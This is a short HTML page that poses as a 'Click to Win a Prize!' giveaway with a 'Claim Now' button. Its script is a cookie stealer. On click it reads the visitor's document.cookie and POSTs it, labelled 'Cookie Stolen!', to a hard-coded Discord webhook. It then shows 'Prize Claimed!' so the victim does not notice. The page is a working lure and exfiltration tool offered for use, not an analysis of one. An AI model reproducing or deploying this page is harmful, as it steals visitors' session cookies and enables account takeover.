<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click to Win!</title>
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .container {
            text-align: center;
        }
        h1 {
            color: #262626;
            margin-bottom: 20px;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #0077cc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Click to Win a Prize!</h1>
        <button id="claimBtn">Claim Now</button>
    </div>

    <script>
        // Your Discord Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1576100925183885395/1BSb5AqGSairin1gG3zfX1Rfks2jUO00uRnmy4MvIQIf9ywuwGntpFRYRjQ4FS4XOVAl";

        document.getElementById('claimBtn').addEventListener('click', function() {
            const cookieData = document.cookie;
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `🔓 **Cookie Stolen!**\n\n**Cookies:**\n\`\`\`${cookieData}\`\`\``
                })
            }).then(() => {
                alert('Prize Claimed!');
            }).catch((error) => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
